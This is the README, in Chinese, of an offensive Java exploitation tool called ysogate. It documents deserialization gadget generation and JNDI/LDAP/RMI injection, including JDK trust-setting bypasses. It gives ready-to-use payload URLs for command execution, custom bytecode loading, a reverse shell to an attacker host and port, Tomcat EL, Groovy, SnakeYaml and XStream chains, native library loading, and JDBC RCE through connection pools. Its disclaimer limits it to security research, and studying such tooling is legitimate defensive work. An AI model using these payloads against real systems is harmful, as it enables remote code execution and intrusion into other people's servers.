# ysogate

ysogate是一个java综合利用工具，支持JNDI注入相关利用，包含多种高版本jdk绕过方式，且支持片段化gadget生成和组合。

- 生成多种Java反序列化gadget payload，
- 支持JNDI/LDAP/RMI/JRMP等多种利用方式
- 灵活的命令行界面，支持多种操作模式
- 可扩展的架构，便于添加新的gadget和攻击向量
- 支持多种高版本jdk绕过方式

## Usage

```bash
[root]#~  Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]
[root]#~  JNDI Mode:    java -jar ysogate-[version]-all.jar -m jndi [JNDI OPTIONS]
```
## JNDI Mode

### trustSerialData 绕过

在jdk20+版本中`com.sun.jndi.ldap.object.trustSerialData`属性默认为`false`

### codebase 注入

ldap和rmi通用，通过 JNDI Reference 指定codebase，远程加载ObjectFactory，需要trustURLCodebase=true，

```
# 参数支持urlsafe base64
ldap://127.0.0.1:1389/Basic/xxxxxxx/Y2FsYw==

# 执行命令
ldap://127.0.0.1:1389/Basic/Command/calc

# Dnslog
ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn

# 加载自定义字节码
ldap://127.0.0.1:1389/Basic/Custom/data:yv66vxxxxxxxxxxxxx

# 从/tmp/a.class加载自定义字节码
ldap://127.0.0.1:1389/Basic/Custom/file:L3RtcC9hLmNsYXNz

# 加载内存马(todo)
ldap://127.0.0.1:1389/Basic/Custom/mem:Tomcat

# 原生反弹 Shell (支持 Windows)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
```

### 基于 BeanFactory

BeanFactory这个类在tomcat8+或者SpringBoot 1.2.x+存在

且要求版本小于9.0.63，或小于8.5.79

**Tomcat ELProcessor**

利用javax.el.ELProcessor#eval

```
# 使用方式同Basic

# 使用el调用ScriptEngineManager来加载字节码(nashorn在JDK15后被移除)
ldap://127.0.0.1:1389/ELProcessor/Command/calc
ldap://127.0.0.1:1389/ELProcessor/Custom/data:yv66vxxxxxxxxxxxxx

# jdk9以上可以用el调用JShell来加载字节码
ldap://127.0.0.1:1389/EL2JShell/Command/calc
```

**GroovyShell & GroovyClassLoader**

利用groovy.lang.GroovyShell#evaluate和groovy.lang.GroovyClassLoader#parseClass(java.lang.String)

```**SnakeYaml**
# 使用方式同Basic
ldap://127.0.0.1:1389/GroovyClassLoader/Command/calc
ldap://127.0.0.1:1389/GroovyShell/Command/calc
```

**SnakeYaml**

利用org.yaml.snakeyaml.Yaml#load(java.lang.String)

```
# 使用方式同Basic
ldap://127.0.0.1:1389/SnakeYaml/Command/calc
```

**XStream**

利用com.thoughtworks.xstream.XStream#fromXML(java.net.URL)

可以打CVE-2021-39149，要求XStream < 1.4.18

```
# 暂时只写了执行命令
ldap://127.0.0.1:1389/XStream/calc
```

**MLet**

通过 MLet 探测 classpath 中存在的类

```
ldap://127.0.0.1:1389/MLet/com.example.TestClass
```

如果 `com.example.TestClass` 这个类存在, 则 HTTP 服务器会接收到一个 `/com/example/TestClass_exists.class` 请求

**NativeLibLoader**

利用com.sun.glass.utils.NativeLibLoader#loadLibrary加载目标服务器上的动态链接库，适用于能够写文件的场景

写入dll/so/dylib文件，例如/tmp/evil.so，使用时把路径去掉后缀， 即/tmp/evil

```
ldap://127.0.0.1:1389/NativeLibLoader/L3RtcC9ldmls
```

### 反序列化





### JDBC RCE

支持以下数据库连接池的 JDBC RCE

- Commons DBCP
- Tomcat DBCP
- Tomcat JDBC
- Alibaba Druid
- HikariCP
- C3P0

#### 

## 扩展攻击

#### 

## Todo
- [x] 基础的反序列化生成payload
- [x] 增加JNDI/LDAP/RMI/JRMP等利用方式
- [ ] 完善第三方库的gadget
- [ ] 在加载字节码方面增加扩展攻击如回显，内存马，代理等
- [ ] 防护绕过方面的补充，增加OverlongUTF8/脏数据等绕过

## 免责声明
本项目仅面向安全研究与学习，禁止任何非法用途

如您在使用本项目的过程中存在任何非法行为，您需自行承担相应后果

除非您已充分阅读、完全理解并接受本协议，否则，请您不要使用本项目

## Reference

 - https://github.com/frohoff/ysoserial
 - https://github.com/X1r0z/JNDIMap
 - https://tttang.com/archive/1405/